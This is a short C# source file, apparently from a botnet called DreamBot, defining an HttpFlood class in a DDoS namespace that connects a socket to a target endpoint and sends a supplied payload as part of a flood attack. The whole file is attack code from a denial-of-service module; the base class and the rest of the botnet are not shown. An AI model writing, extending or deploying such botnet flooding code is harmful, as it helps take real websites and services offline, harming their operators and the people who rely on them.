using System.Net;
using System.Net.Sockets;

namespace DreamBot.Actions.DDoS
{
    class HttpFlood : Attack
    {
        private readonly byte[] _buffer;

        public HttpFlood(EndPoint endpoint, byte[] data) 
            : base(endpoint)
        {
            _buffer = data;
        }

        protected override void DoIt(Socket socket)
        {
            socket.Connect(_endpoint);
            socket.Send(_buffer);
        }
    }
}